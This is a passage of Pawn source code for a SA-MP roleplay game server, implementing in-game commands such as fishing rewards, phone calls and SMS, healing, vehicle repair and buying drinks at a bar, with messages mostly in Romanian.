		format(gString, 128, "* %s caught a common fish that can be sold for about $%s.", GetName(playerid), FormatNumber(x));
		SendClientMessage(playerid, COLOR_YELLOW, gString);	
		SCMf(playerid, COLOR_WHITE, "Ai prins un peste normal de $%s!", FormatNumber(x));
		SendClientMessage(playerid, -1, "Pentru a vinde pestele, mergi la un magazin 24/7 (/gps).");		
	}
	HaveFish[playerid] += x;
	fishCount[playerid]++;
	TogglePlayerControllable(playerid, true);
	return true;
}

stock give_fish(playerid) {
	new x; gString[0] = (EOS);
	TogglePlayerControllable(playerid, true);
	ClearAnimations(playerid, true);
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
    RemovePlayerAttachedObject(playerid, 1);
    ++fishCount[playerid];
	x = RandomEx(10000, 20000) + GetPlayerSkill(playerid)*500;
	switch(PlayerInfo[playerid][pMember]) {
		case 1,2,3,7,8,9,11,12,13,14,15: {}
		default: CheckMission(playerid, 9);
	}
	new rar = random(500);
	if(rar >= 450 && rar < 489) {
		x += RandomEx(30000, 40000);			
		format(gString, 128, "* %s caught a rare fish that can be sold for about $%s.", GetName(playerid), FormatNumber(x));
		NearMessage(playerid, COLOR_YELLOW, gString);	
		SCMf(playerid, COLOR_BLUE, "Ai prins un peste rar de $%s! (%d/5)", FormatNumber(x), fishCount[playerid]);						
	}
	else if(rar >= 490) {
		x += RandomEx(40000, 60000);
		format(gString, 128, "* %s caught a very rare fish that can be sold for about $%s.", GetName(playerid), FormatNumber(x));
		NearMessage(playerid, COLOR_YELLOW, gString);	
		SCMf(playerid, COLOR_BLUE, "Ai prins un peste foarte rar de $%s! (%d/5)", FormatNumber(x), fishCount[playerid]);	
	}
	else {
		format(gString, 128, "* %s caught a common fish that can be sold for about $%s.", GetName(playerid), FormatNumber(x));
		SendClientMessage(playerid, COLOR_YELLOW, gString);	
		SCMf(playerid, COLOR_WHITE, "Ai prins un peste normal de $%s! (%d/5)", FormatNumber(x), fishCount[playerid]);	
	}
	HaveFish[playerid] += x;
	new i=fishCount[playerid];
	if(i>=5) {
		SendClientMessage(playerid,-1, "{75db3d}(Fisher Job) {FFFFFF}Mergi la checkpoint pentru a lasa barca.");
		switch(PlayerInfo[playerid][pJob]) {
			case 11: SetPlayerCheckpoint(playerid, 2349.7195,519.3442,-0.5034, 5.0);
			case 13: SetPlayerCheckpoint(playerid, 383.3894,-2096.9370,-0.3518, 5.0);
			case 16: SetPlayerCheckpoint(playerid, -2979.6145,508.9251,-0.4661, 5.0);
		}
		CP[playerid] = 723;
		return true;
    }
    set_fish_checkpoint(playerid);
	SCMf(playerid,-1, "{75db3d}(Fisher Job) {FFFFFF}Urmatoarea locatie unde poti sa pescuesti se afla la %.1fm.", get_distance_fish(playerid));
	return true;
}

cmd:apark(playerid, params[]) {
	if !IsAdmin(playerid, 7) *then 
		return true;

	if !IsPlayerInAnyVehicle(playerid) *then 
		return SendClientMessage(playerid, COLOR_GREY, "Nu te aflii intr-un vehicul.");

	new carid, car;
	if((carid=FindSpawnID((car=GetPlayerVehicleID(playerid))))==-1) 
		return true;

	GetVehiclePos(car, CarInfo[carid][cLocationx], CarInfo[carid][cLocationy], CarInfo[carid][cLocationz]);
	GetVehicleZAngle(car, CarInfo[carid][cAngle]);
 	DestroyVehicleEx(car, "");
  	CarInfo[carid][Spawned] = CreateVehicleEx(CarInfo[carid][cModel],CarInfo[carid][cLocationx],CarInfo[carid][cLocationy],CarInfo[carid][cLocationz]+1.0,CarInfo[carid][cAngle],CarInfo[carid][cColorOne],CarInfo[carid][cColorTwo]);
	VehicleSQL[CarInfo[carid][Spawned]] = carid;	
	SetTunning(carid);
    saveCar(carid);
	return true;
}
cmd:jobs(playerid) {
	if JobWorking[playerid] *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi aceasta coamnda cand muncesti.");
	
	gString[0] = (EOS);
	strcat(gString, "Job name\tJob Level\tJob Owner\tDistance\n");
	new j=0;
	while(++j<=sql_jobs) {
		format(gQuery, 128, "%d. %s\t%d\t%s\t%0.2fm\n", j, JobInfo[j][jName],JobInfo[j][jLevel], JobInfo[j][jOwner], GetPlayerDistanceFromPoint(playerid, JobInfo[j][jPosX],JobInfo[j][jPosY],JobInfo[j][jPosZ]));
		strcat(gString, gQuery);
	}
	format(gQuery, 60, "Jobs: %d", sql_jobs);
	ShowPlayerDialog(playerid, DIALOG_JOBS, DIALOG_STYLE_TABLIST_HEADERS, gQuery, gString, "Ok", "Cancel");
	return true;
}

cmd:locations(playerid, params[]) return ShowPlayerDialog(playerid, DIALOG_LOCATIONS, DIALOG_STYLE_LIST, "GPS", "Businesses\nImportant Locations\nTuning & Neon Place\nShop Quest\nBattlepass Reward", "Select", "Exit");

cmd:heal(playerid, params[]) {
	if(PaintType[playerid]) return true;
	switch InInterior[playerid] do {
		case INVALID_INTERIOR: {
			new Float:health, hp_price = 1000 * (100-floatround(health));

			if(PlayerInfo[playerid][pMember] != 13 && PlayerInfo[playerid][pMember] != 20)return true;
			if(DeelayCommand[playerid][4] > gettime()) return DeelayTime(playerid, 4);
			extract params -> new player:id; else return SendUsageMsg(playerid, "heal [id]");
			if(!IsPlayerConnected(id)) return SendErrorMsg(playerid, "Acel player nu este conectat!");
			if(id == playerid) return SendErrorMsg(playerid, "Nu poti folosi aceasta comanda asupra ta!"); 	
			if(GetPlayerCash(id) < 1000 * (100-floatround(health))) return SendErrorMsg(playerid, "Acel player nu are destui bani.");
			if(!IsAnAmbulance(GetPlayerVehicleID(id))) return SendErrorMsg(playerid, "Acel player nu este in ambulanta.");
			if(PlayerInfo[playerid][pMember] != PlayerInfo[id][pMember]) AddFactionRaport(playerid, 0);	

			GivePlayerCash(playerid, hp_price); GivePlayerCash(id, -hp_price);
			GetPlayerHealth(id, health); SetPlayerHealthEx(id, 99);
			
			va_SendClientMessage(id, COLOR_MONEY, "Ai primit viata pentru %s$.",FormatNumber(hp_price));
			va_GameTextForPlayer(playerid, "healed +$%s", 3000, 1, FormatNumber(hp_price));
			DeelayCommand[playerid][4] = gettime()+30;
			return PlayerPlaySound(playerid, 1150, 0.0, 0.0, 0.0);
		}
		case HOUSE_INTERIOR: {
			if(HouseInfo[InInteriorID[playerid]][hHel]) return true;
			if(OnDuty[playerid]) {
				ProxDetector(30.0, playerid, "* %s si-a pus armura.", COLOR_PURPLE, GetName(playerid));
				SetPlayerArmourEx(playerid,99.0);
			}
			SetPlayerHealthEx(playerid,99.0);
		}
		case HQ_INTERIOR: {
			if(InInteriorID[playerid] != PlayerInfo[playerid][pMember] || !PlayerInfo[playerid][pMember]) return true;
			if(OnDuty[playerid] == 1) SetPlayerArmourEx(playerid,99.0);
			SetPlayerHealthEx(playerid,99.0);
		}
	}
	return true;
}

cmd:call(playerid, params[]) {
	if(!HavePhone(playerid)) return SendErrorMsg(playerid, "Nu ai un telefon.");
	if(PaintType[playerid] != 0) return SendErrorMsg(playerid, "Nu poti folosi aceasta comanda in arena de paintball!");
	if(PhoneOnline[playerid]) return SendErrorMsg(playerid, "Telefon-ul tau este inchis.");

	if(PlayerInfo[playerid][pVip] < 2) {
		extract params -> new string:number[10]; else return SendUsageMsg(playerid, "call [number]");

		switch(YHash(number, false) && posible_wanted[playerid] != -1) {
			case _I<112>: {
				if(OnDuty[playerid] == 1) return true;
			    if(PlayerInfo[playerid][pLevel] < 3) return SendErrorMsg(playerid, "Aceasta comanda este disponibila la nivel 3!");
			    if(!IsPlayerConnected(posible_wanted[playerid])) return SendErrorMsg(playerid, "Acel player nu este conectat!");
			    if(PlayerInfo[posible_wanted[playerid]][pWantedLevel] >= 6) return SendErrorMsg(playerid, "Acel player are niveul maxim de wanted!");

			    SendClientMessage(playerid,COLOR_CLIENT,"Crima raportata!");
			    SetPlayerCriminal(posible_wanted[playerid], playerid, "first degree murder");
			    posible_wanted[playerid] = -1;	
			    return true;
			}
		}
        
		new giveplayerid;
		if((giveplayerid=GetGVarInt(number)-1) == -1) return true;
		if(!strcmp(number,PlayerInfo[playerid][pPhone],true)) return SendErrorMsg(playerid, "Nu te poti suna singur.");
		if(Mobile[playerid] != -1) return SendErrorMsg(playerid, "Esti deja intr-un apel.");
		if(IsBlocked(giveplayerid, playerid)) return SendErrorMsg(playerid, "Acel player te-a blocat! Nu il poti contacta.");
		if(IsBlocked(playerid, giveplayerid)) return SendErrorMsg(playerid, "Ai blocat pe acel player! Nu il poti contacta.");
		if(Spectate[giveplayerid] != -1) return SendErrorMsg(playerid, "Acel player este ocupat!");
		if(PhoneOnline[giveplayerid] > 0) return SendErrorMsg(playerid, "Are telefonul inchis.");
		if(Mobile[giveplayerid] != -1) return SendErrorMsg(playerid, "Acel player este deja intr-un apel.");
		if(!PhoneCalls[giveplayerid]) return SendErrorMsg(playerid, "Nu poti sa il apelezi pe acel jucator deoarece si-a inchis apelurile.");

		call_player[giveplayerid] = playerid; CellTime[playerid] = 1;
		ProxDetector(30.0, playerid, "* %s takes out their %s, and dials in a number.", COLOR_PURPLE, GetName(playerid), strlen(PlayerInfo[playerid][pPhone]) > 4 ? ("cellphone"):("iPhone"));
        ProxDetector(20.0, giveplayerid, "* %s's %s starts to ring...", COLOR_PURPLE, GetName(giveplayerid), strlen(PlayerInfo[giveplayerid][pPhone]) > 4 ?("cellphone"):("iPhone"));
		va_SendClientMessage(giveplayerid, COLOR_YELLOW, "%s is calling you. Use /p to answer your phone.", GetName(playerid));
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USECELLPHONE);
	} 
	else {		
		extract params -> new string:number[10]; else return SendUsageMsg(playerid, "call [id]");

		switch(YHash(number, false) && posible_wanted[playerid] != -1) {
			case _I<112>: {
				if(OnDuty[playerid] == 1) return true;
			    if(PlayerInfo[playerid][pLevel] < 3) return SendErrorMsg(playerid, "Aceasta comanda este disponibila la nivel 3!");
			    if(!IsPlayerConnected(posible_wanted[playerid])) return SendErrorMsg(playerid, "Acel player nu este conectat!");
			    if(PlayerInfo[posible_wanted[playerid]][pWantedLevel] >= 6) return SendErrorMsg(playerid, "Acel player are niveul maxim de wanted!");

			    SendClientMessage(playerid,COLOR_CLIENT,"Crima raportata!");
			    SetPlayerCriminal(posible_wanted[playerid], playerid, "first degree murder");
			    posible_wanted[playerid] = -1;	
			    return true;
			}
		}
        
		new id =-1;
		if(IsNumeric(number)) id = strval(number);
		else {
			id = GetGVarInt(number)-1;
			if(id == -1) return SendErrorMsg(playerid, "Invalid Number!");
		}

		if(!IsPlayerConnected(id)) return SendErrorMsg(playerid, "Acel player nu este conectat!");
		if(!HavePhone(id)) return SendErrorMsg(playerid, "Acel player nu are telefon!");
		if(id == playerid) return SendErrorMsg(playerid, "Nu te poti suna singur.");
		if(Mobile[playerid] != -1) return SendErrorMsg(playerid, "Esti deja intr-un apel.");
		if(IsBlocked(id, playerid)) return SendErrorMsg(playerid, "Acel player te-a blocat! Nu il poti contacta.");
		if(IsBlocked(playerid, id)) return SendErrorMsg(playerid, "Ai blocat pe acel player! Nu il poti contacta.");
		if(Spectate[id] != -1) return SendErrorMsg(playerid, "Acel player este ocupat!");
		if(PhoneOnline[id] > 0) return SendErrorMsg(playerid, "Are telefonul inchis.");
		if(Mobile[id] != -1) return SendErrorMsg(playerid, "Acel player este deja intr-un apel.");
		if(!PhoneCalls[id]) return SendErrorMsg(playerid, "Nu poti sa il apelezi pe acel jucator deoarece si-a inchis apelurile.");

		call_player[id] = playerid; CellTime[playerid] = 1;
		ProxDetector(30.0, playerid, "* %s takes out their %s, and dials in a number.", COLOR_PURPLE, GetName(playerid), strlen(PlayerInfo[playerid][pPhone]) > 4 ? ("cellphone"):("iPhone"));
        ProxDetector(20.0, id, "* %s's %s starts to ring...", COLOR_PURPLE, GetName(id), strlen(PlayerInfo[id][pPhone]) > 4 ?("cellphone"):("iPhone"));
		va_SendClientMessage(id, COLOR_YELLOW, "%s is calling you. Use /p to answer your phone.", GetName(playerid));
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USECELLPHONE);
	}
	return true;
}

cmd:sms(playerid, params[]) {
	if(!HavePhone(playerid)) return SendErrorMsg(playerid, "Nu ai un telefon.");
	if(PlayerInfo[playerid][pMuted]) return va_SendClientMessage(playerid, COLOR_GREY, "You can't talk right now! You are muted. (%d seconds)",PlayerInfo[playerid][pMuteTime]);
	if(PhoneOnline[playerid] > 0) return SendErrorMsg(playerid, "Telefon-ul tau este inchis.");

	if(PlayerInfo[playerid][pVip] < 2) {
		extract params -> new string:phonenumb[10], string:message[128]; else return SendUsageMsg(playerid, "sms [number] [text]");
		if(FaceReclama(message)) return Reclama(playerid, message);

		if(PlayerInfo[playerid][pVip] > 1) {
			new id = strval(phonenumb);
			if(!IsPlayerConnected(id)) return SendErrorMsg(playerid, "Acel player nu este conectat!");
			if(!IsPlayerLogged(id)) return SendErrorMsg(playerid, "Acel player nu este logat!");
			if(!HavePhone(id)) return SendErrorMsg(playerid, "Acel player nu are telefon!");
			return strmid(phonenumb, PlayerInfo[id][pPhone], 0, 10);
		}

		new giveplayerid;
		if((giveplayerid = GetGVarInt(phonenumb) -1) == -1) return true;
		if(giveplayerid == playerid) return SendErrorMsg(playerid, "Nu iti poti da sms singur.");
		if(IsBlocked(giveplayerid, playerid)) return SendErrorMsg(playerid, "Acel player te-a blocat! Nu il poti contacta.");
		if(IsBlocked(playerid, giveplayerid)) return SendErrorMsg(playerid, "L-ai blocat pe acel player! Nu il poti contacta.");
		if(Spectate[giveplayerid] != -1) return SendErrorMsg(playerid, "Acel player este ocupat!");
		if(PhoneMessages[giveplayerid] != 1) return SendErrorMsg(playerid, "Acel jucator si-a oprit mesajele.");

        PlayerInfo[playerid][pCredit] --; Reply[giveplayerid] = playerid;
		va_SendClientMessage(giveplayerid, COLOR_YELLOW, "SMS from %s ({FFFFFF}%s{FFFF00}): %s", GetName(playerid), phonenumb, message);
		va_SendClientMessage(playerid, 0xC8E0DFFF, "SMS sent to %s ({FFFFFF}%s{C8E0DF}): %s", GetName(giveplayerid), phonenumb, message);
		PlayerPlaySound(giveplayerid, 1138, 0.0, 0.0, 0.0);
		ChatLog(playerid, "(sms) %s catre %s: %s", GetName(playerid), GetName(giveplayerid), message);
	} 
	else {
		extract params -> new string:number[10], string:message[128]; else return SendUsageMsg(playerid, "sms [id - number] [text]");
		if(FaceReclama(message)) return Reclama(playerid, message);

		new id;
		if(IsNumeric(number)) id = strval(number);
		else {
			id=GetGVarInt(number);
			if(id == -1) return SendErrorMsg(playerid, "Invalid number!");
		}

		if(!IsPlayerConnected(id)) return SendErrorMsg(playerid, "Acel player nu este conectat!");
		if(!IsPlayerLogged(id)) return SendErrorMsg(playerid, "Acel player nu este logat!");
		if(!HavePhone(playerid)) return SendErrorMsg(playerid, "Acel player nu are telefon!");
		if(id == playerid) return SendErrorMsg(playerid, "Nu iti poti da sms singur.");
		if(IsBlocked(id, playerid)) return SendErrorMsg(playerid, "Acel player te-a blocat! Nu il poti contacta.");
		if(IsBlocked(playerid, id)) return SendErrorMsg(playerid, "L-ai blocat pe acel player! Nu il poti contacta.");
		if(Spectate[id] != -1) return SendErrorMsg(playerid, "Acel player este ocupat!");
		if(PhoneMessages[id] != 1) return SendErrorMsg(playerid, "Acel jucator si-a oprit mesajele.");
		if(PlayerInfo[id][pVip] < 2) va_SendClientMessage(id, COLOR_YELLOW, "SMS from %s ({FFFFFF}%s{FFFF00}): %s", GetName(playerid), PlayerInfo[playerid][pPhone], message);
		else va_SendClientMessage(id, COLOR_YELLOW, "SMS from %s ({FFFFFF}%d{FFFF00}): %s", GetName(playerid), playerid, message);

        PlayerInfo[playerid][pCredit] --; Reply[id] = playerid;
		va_SendClientMessage(playerid, 0xC8E0DFFF, "SMS sent to %s ({FFFFFF}%s{C8E0DF}): %s", GetName(id), PlayerInfo[id][pPhone], message);
		ChatLog(playerid, "(sms) %s catre %s: %s", GetName(playerid), GetName(id), message);	
		PlayerPlaySound(id, 1138, 0.0, 0.0, 0.0);
	}
	return true;
}

cmd:vr(playerid) return callcmd::vehiclerepair(playerid);
cmd:vehiclerepair(playerid) {
	if(PlayerInfo[playerid][pVip] < 2) return SendErrorMsg(playerid, "Nu esti autorizat sa folosesti aceasta comanda!");
	if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMsg(playerid, "Nu esti intr-un vehicul!");
	if(DeelayCommand[playerid][29] > gettime()) return DeelayTime(playerid, 29);

	new idd = FindSpawnID(GetPlayerVehicleID(playerid));
	RepairVehicle(GetPlayerVehicleID(playerid));
	if(idd!=-1) SetVehicleHealth(CarInfo[idd][Spawned], !CarInfo[idd][cVip] ? 999.0 : 2000.0);
	else SetVehicleHealth(GetPlayerVehicleID(playerid), 999.0);
	DeelayCommand[playerid][29] = gettime()+(PlayerInfo[playerid][pVip] != 3 ? 300 : 150);
	return SendClientMessage(playerid, -1, "Vehicle repair successfully!");
}

cmd:missedcalls(playerid, params[]) {
	if(!PlayerInfo[playerid][pReborn])
		return true;

	SendClientMessage(playerid, -1, "-- Last 10 missed calls --");
	for(new i=0;i<missed_calls[playerid][12];i++) {
		new id = missed_calls[playerid][i];
		if IsPlayerConnected(id) *then SCMf(playerid, COLOR_YELLOW, "%d. Call from %s ({FFFFFF}%s{FFFF00}) - [%02d:%02d]", i+1, GetName(id), PlayerInfo[id][pPhone], missed_calls[playerid][10], missed_calls[playerid][11]);
	}
	SendClientMessage(playerid, -1, "--");
	return true;
}

cmd:re(playerid, params[]) {	
	if(!IsAdmin(playerid, 1) && PlayerInfo[playerid][pHelper] < 1) return SendErrorMsg(playerid, AdminOnly);
	extract params -> new player:id, string:message[128]; else return SendUsageMsg(playerid, "re [id] [message]");
	if(!IsPlayerConnected(id)) return SendErrorMsg(playerid, "Acel player nu este conectat!");
	if(!IsPlayerLogged(id)) return SendErrorMsg(playerid, "Acel player nu este logat!");
	va_SendClientMessage(id, COLOR_YELLOW, ">> %s: %s <<", GetName(playerid), message);
	return SendStaffMessage(COLOR_YELLOW, "(/re)%s->%s: %s", GetName(playerid), GetName(id), message);
}

cmd:reply(playerid, params[]) {
	if(Reply[playerid] == -1) return true;
	if(strlen(PlayerInfo[playerid][pPhone]) > 4) return SendErrorMsg(playerid, "Nu ai un iPhone!");
	if(!IsPlayerConnected(Reply[playerid])) return Reply[playerid] = -1, 0;
	if(!IsPlayerLogged(Reply[playerid])) return Reply[playerid] = -1,0;
	if(PlayerInfo[playerid][pMuted] == 1) return va_SendClientMessage(playerid, COLOR_GREY, "You can't talk right now! You are muted. (%d seconds)",PlayerInfo[playerid][pMuteTime]);
	extract params -> new string:result[128]; else return SendUsageMsg(playerid, "reply [text]");
	if(FaceReclama(result)) return Reclama(playerid, result);
	if(PhoneOnline[playerid]) return SendErrorMsg(playerid, "Telefon-ul tau este inchis.");
	if(IsBlocked(Reply[playerid], playerid)) return SendErrorMsg(playerid, "Acel player te-a blocat! Nu il poti contacta.");
	if(IsBlocked(playerid, Reply[playerid])) return SendErrorMsg(playerid, "Ai blocat pe acel player! Nu il poti contacta.");
	if(Spectate[Reply[playerid]] != -1) return SendErrorMsg(playerid, "Acel player este ocupat!");

	PlayerInfo[playerid][pCredit] --;
	va_SendClientMessage(Reply[playerid], COLOR_YELLOW, "SMS from %s ({FFFFFF}%s{FFFF00}): %s", GetName(playerid), PlayerInfo[playerid][pPhone], result);
	va_SendClientMessage(playerid, 0xC8E0DFFF, "SMS sent to %s ({FFFFFF}%s{C8E0DF}): %s", GetName(Reply[playerid]), PlayerInfo[Reply[playerid]][pPhone], params);
	ChatLog(playerid, "(sms) %s catre %s: %s", GetName(Reply[playerid]), GetName(Reply[playerid]), result);
	PlayerPlaySound(Reply[playerid], 1138, 0.0, 0.0, 0.0);
	return true;
}

cmd:speaker(playerid) {
	if(!HavePhone(playerid)) return SendErrorMsg(playerid, "Nu ai un telefon.");
	if(Mobile[playerid] == -1) return SendErrorMsg(playerid, "Nu esti intr-un apel.");
	
	PlayerInfo[playerid][pSpeaker] = PlayerInfo[playerid][pSpeaker] ? true : false;
	return va_SendClientMessage(playerid, -1, "Diifuzor %s.", PlayerInfo[playerid][pSpeaker] == 1 ? "pornit" : "oprit");
}

cmd:turn(playerid, params[]) {
	extract params -> new string:turn[6]; else 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/turn <Off/On/Calls/Messages(only legends)>");

	switch YHash(turn) do {
		case _H<off>: {
			if PhoneOnline[playerid] *then
				return SendClientMessage(playerid, -1, "Telefonul tau este deja inchis!");

			PhoneOnline[playerid] = true;
			format(gString, sizeof gString, "* %s turns off his/her phone.", GetName(playerid));
			UpdateVar(playerid, "PhoneStatus", PhoneOnline[playerid]);
		}
		case _H<on>: {
			if !PhoneOnline[playerid] *then
				return SendClientMessage(playerid, -1, "Telefonul tau este deja deschis!");

			PhoneOnline[playerid] = false;
			format(gString, sizeof gString, "* %s turns on his/her phone.", GetName(playerid));
			UpdateVar(playerid, "PhoneStatus", PhoneOnline[playerid]);
		}
		case _H<calls>: {
			PhoneCalls[playerid] = !PhoneCalls[playerid];

			format(gString, sizeof gString, "* %s turns %s his/her calls.", GetName(playerid), PhoneCalls[playerid]?"on":"off");
			UpdateVar(playerid, "PhoneCalls", PhoneCalls[playerid]);
		}
		case _H<messages>: {
			if(PlayerInfo[playerid][pVip] < 3) return SendClientMessage(playerid, -1, "Nu ai cont LEGEND!");
			PhoneMessages[playerid] = !PhoneMessages[playerid];

			format(gString, sizeof gString, "* %s turns %s his/her messages.", GetName(playerid), PhoneMessages[playerid]?"on":"off");
			UpdateVar(playerid, "PhoneMessages", PhoneMessages[playerid]);
		}
		default: return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/turn <Off/On/Calls/Messages(only legends)>");
	}
	ProxDetector(30.0, playerid, gString, COLOR_PURPLE);
    return true;
}
cmd:p(playerid, params[]) {
	if Mobile[playerid] != -1 *then
		return SendClientMessage(playerid, COLOR_GRAD2, "Esti deja intr-un apel!");

	if PhoneOnline[playerid] == 1 *then
		return SendClientMessage(playerid, COLOR_GREY, "Telefonul tau este inchis!");

	if call_player[playerid]==-1 *then return true;
	new id = call_player[playerid];
	call_player[playerid]=-1;
	Mobile[playerid] = id;
	Mobile[id] = playerid;
	SetTimerEx(#check_player_call, 60000, false, #i, id);
	PlayerInfo[playerid][pChatCMD] = 9;
	PlayerTextDrawHide(playerid, ChatCMD);
	PlayerInfo[id][pChatCMD] = 9;
	PlayerTextDrawHide(id, ChatCMD);
	SCMf(id, COLOR_YELLOW, "%s a raspuns la telefon.", GetName(playerid));
	format(gString, 128, "* %s a raspuns la telefon.", GetName(playerid));
	ProxDetector(30.0, playerid, gString, COLOR_PURPLE);
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USECELLPHONE);
	SetPlayerSpecialAction(id,SPECIAL_ACTION_USECELLPHONE);
	return true;
}

redist::check_player_call(playerid) {
	if(Mobile[playerid]==-1) 
		return true;

	if(--PlayerInfo[playerid][pCredit] < 1) {
		callcmd::hangup(playerid);
		callcmd::hangup(Mobile[playerid]);
		return true;
	}
	SetTimerEx(#check_player_call, 60000, false, #i, playerid);
	return true;
}

cmd:pcolor(playerid, params[]) {
	if(PlayerInfo[playerid][pPremiumAccount] == 0) return true;
	if(PlayerInfo[playerid][pVip] == 3) return SendClientMessage(playerid, -1, "Foloseste (/legendcolor)!");
	ShowPlayerDialog(playerid, DIALOG_PCOLOR, DIALOG_STYLE_LIST, "Nickname color", 
		"{CECECE}White\n{0087FE}Blue\n{4700C2}Dark purple\n{EBFF00}Yellow\n{EF00FF}Purple\n{40FF00}Green\n{9CFF29}Lime green\n{0E7F03}Dark green\n{FF9A00}Orange\n{6E6E6E}Black\n{FF4C9D}Pink\n{F4FA58}Yellow 2\n{00BFFF}Blue 2\n{819FF7}Blue 3\n{FE9A2E}Orange 2\n{FA8258}Orange 3\n{00FF40}Green 2\n{D358F7}Purple 2\n{4169E1}Royal Blue\n{9ACD32}YellowGreen\n{F0E68C}Khaki\n{BDB76B}DarkKhaki\n{FF1493}DeepPink\n{9966CC}Amethyst\n{F0B2B2}PinkOrange\n{DB7093}PaleVioletRed", "Choose", "Cancel");
	return true;
}
cmd:hangup(playerid) {
	new caller = call_player[playerid]!=-1?call_player[playerid]:Mobile[playerid];
	if !IsPlayerConnected(caller) *then
		return SendClientMessage(playerid,-1, "Nu esti intr-un apel.");
	
	if Mobile[caller]==-1&&missed_calls[playerid][12]!=10&&PlayerInfo[caller][pReborn] *then {
		missed_calls[caller][missed_calls[playerid][12]] = playerid;
		missed_calls[playerid][12]++;
		new x;
		gettime(missed_calls[caller][10], missed_calls[caller][11], x);
	}

	CellTime[caller] = 0;
	CellTime[playerid] = 0;
	call_player[playerid] = -1;
	SendClientMessage(playerid, COLOR_WHITE,"Your call has been terminated by the other party.");
	SendClientMessage(caller, COLOR_WHITE,"Your call has been terminated by the other party.");
	Mobile[caller] = -1;
	PlayerInfo[playerid][pChatCMD] = 0;
	PlayerTextDrawHide(playerid, ChatCMD);
	SetPlayerSpecialAction(caller,SPECIAL_ACTION_STOPUSECELLPHONE);

	RemovePlayerAttachedObject(caller,4);
	RemovePlayerAttachedObject(playerid,4);
	PlayerInfo[caller][pChatCMD] = 0;
	PlayerTextDrawHide(caller, ChatCMD);
	Mobile[playerid] = -1;
	PlayerInfo[playerid][pSpeaker] = 0;
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
	return true;
}

cmd:chatcmd(playerid) {
	if PlayerInfo[playerid][pLevel] < 3 *then
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de level 3!");

	if Spectate[playerid]!=-1 *then
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi aceasta comanda cat timp esti in spec!");

	switch PlayerInfo[playerid][pChatCMD] do {
    	case 7: return SendClientMessage(playerid, COLOR_LGREEN, "Nu poti folosi aceasta comanda cat timp vorbesti la telefon!");
    	case 8: return SendClientMessage(playerid, COLOR_LGREEN, "Nu poti folosi aceasta comanda in timp ce faci live!");
    	case 9: return true;
    	case 11: return SendClientMessage(playerid, COLOR_LGREEN, "Nu poti folosi aceasta comanda in pain!");
    }
	ShowPlayerDialog(playerid, DIALOG_CHATCMD, DIALOG_STYLE_LIST, "Chat CMD", "{FF0000}Disable Chat CMD\nFrequency\nCar Whisper\nClan Chat\nFaction Chat\nPremium Chat\nVIP Chat\nReborn Chat\nLegend Chat", "Select", "Cancel");
	return true;
}

cmd:drink(playerid, params[]) {
	if InInterior[playerid]!=BUSINESS_INTERIOR *then 
		return SendClientMessage(playerid, COLOR_GREY, "Nu esti la bar.");

	if BizzInfo[InInteriorID[playerid]][bType]!=3&&BizzInfo[InInteriorID[playerid]][bType]!=4 *then 
		return SendClientMessage(playerid, COLOR_GREY, "Nu esti la bar.");

	extract params -> new string:drink[32]; else {
		SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/drink <Drink name>");
		SendClientMessage(playerid, COLOR_WHITE, "Alcohol: Beer (1,000$), Wine (1,500$), Vodka(3,000$), Whiskey(5,000$)");
		SendClientMessage(playerid, COLOR_WHITE, "Refreshments: Water (20$), Soda (50$), Sprunk(200$), Coffee (500$)");
		return true;
	}
	switch YHash(drink) do {
		case _H<beer>: {
			if GetPlayerCash(playerid) < 1000 *then 
				return SendClientMessage(playerid,COLOR_WHITE,"Nu ai bani destui.");

			GivePlayerCash(playerid, -1000);
			BizzInfo[InInteriorID[playerid]][bBalance] += 1000;
			SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_BEER);		
			CheckMission(playerid, 4);	
		}
		case _H<vodka>: {
			if GetPlayerCash(playerid) < 3000 *then 
				return SendClientMessage(playerid,COLOR_WHITE,"Nu ai bani destui.");

			GivePlayerCash(playerid, -3000);
			SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_WINE);
			BizzInfo[InInteriorID[playerid]][bBalance] += 3000;	
			CheckMission(playerid, 4);			
		}
		case _H<whiskey>: {
			if GetPlayerCash(playerid) < 5000 *then
				return SendClientMessage(playerid,COLOR_WHITE,"Nu ai bani destui.");

			GivePlayerCash(playerid, -5000);	
			SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_WINE);
			BizzInfo[InInteriorID[playerid]][bBalance] += 5000;		
			CheckMission(playerid, 4);	
		}
		case _H<wine>: {
			if GetPlayerCash(playerid) < 1500 *then 
				return SendClientMessage(playerid,COLOR_WHITE,"Nu ai bani destui.");

			GivePlayerCash(playerid, -1500);			
			SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_WINE);
			BizzInfo[InInteriorID[playerid]][bBalance] += 1500;			
			CheckMission(playerid, 4);			
		}
		case _H<water>: {
			if GetPlayerCash(playerid) < 20 *then 
				return SendClientMessage(playerid,COLOR_WHITE,"Nu ai bani destui.");
			
			GivePlayerCash(playerid, -20);
			SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK);
			BizzInfo[InInteriorID[playerid]][bBalance] += 20;	
		}
		case _H<soda>: {
			if GetPlayerCash(playerid) < 50 *then 
				return SendClientMessage(playerid,COLOR_WHITE,"Nu ai bani destui.");
			
			GivePlayerCash(playerid, -50);
			SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK);
			BizzInfo[InInteriorID[playerid]][bBalance] += 50;	
		}
		case _H<sprunk>: {
			if GetPlayerCash(playerid) < 200 *then 
				return SendClientMessage(playerid,COLOR_WHITE,"Nu ai bani destui.");
	
			GivePlayerCash(playerid, -200);
			SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK);
			BizzInfo[InInteriorID[playerid]][bBalance] += 200;
		}
		case _H<coffee>: {
